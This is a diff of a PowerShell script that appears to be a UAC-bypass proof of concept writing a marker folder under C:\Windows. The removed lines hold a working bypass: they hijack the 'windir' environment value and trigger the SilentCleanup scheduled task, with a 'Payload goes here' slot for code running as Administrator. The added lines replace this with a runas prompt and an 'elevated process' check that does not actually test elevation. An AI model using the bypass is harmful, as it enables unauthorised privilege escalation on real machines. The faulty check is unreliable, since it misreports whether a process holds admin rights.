@@ -1,25 +1,28 @@
+# Check if current script is running with administrator privileges
 if (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544") {
-    # Payload goes here
-    # It will run as Administrator
+    # If script is already running as administrator, proceed with desired actions
     mkdir C:\Windows\uas-bypass
 } else {
-    # Open Command Prompt as administrator
-    $startInfo = New-Object System.Diagnostics.ProcessStartInfo
-    $startInfo.FileName = "cmd.exe"
-    $startInfo.Verb = "runas"  # This triggers the 'run as administrator' prompt
-    $startInfo.Arguments = "/c echo This will run as admin"
-    [System.Diagnostics.Process]::Start($startInfo)
-    
-    # Optional - You can modify the rest of your script based on education logic or needs
-    # You may also want to handle cases when the user declines the 'run as administrator' prompt.
-    
-    # If you still want to proceed with the registry method as fallback
-    $registryPath = "HKCU:\Environment"
-    $Name = "windir"
-    $Value = "powershell -ep bypass -w h $PSCommandPath;#"
-    Set-ItemProperty -Path $registryPath -Name $name -Value $Value
+    # Look for any existing elevated processes like 'explorer.exe' or 'powershell.exe'
+    $elevatedProcesses = Get-WmiObject Win32_Process | Where-Object { 
+        $_.GetOwner().User -ne $null -and $_.Name -in @("explorer.exe", "powershell.exe")
+    }
 
-    # Depending on the performance of the machine, some sleep time may be required before or after schtasks
-    schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null
-    Remove-ItemProperty -Path $registryPath -Name $name
+    # If elevated process found, execute desired action
+    if ($elevatedProcesses) {
+        Write-Host "Elevated process found, proceeding with task..."
+
+        # Insert your task here, for example:
+        mkdir C:\Windows\uas-bypass
+    } else {
+        # If no elevated processes found, you can trigger 'runas' or other actions
+        Write-Host "No elevated process found, trying to trigger admin task..."
+        
+        # Trigger UAC to run as administrator if no elevated process is running
+        $startInfo = New-Object System.Diagnostics.ProcessStartInfo
+        $startInfo.FileName = "powershell.exe"
+        $startInfo.Verb = "runas"  # This will prompt for admin rights
+        $startInfo.Arguments = "-Command {mkdir C:\Windows\uas-bypass}"
+        [System.Diagnostics.Process]::Start($startInfo)
+    }
 }
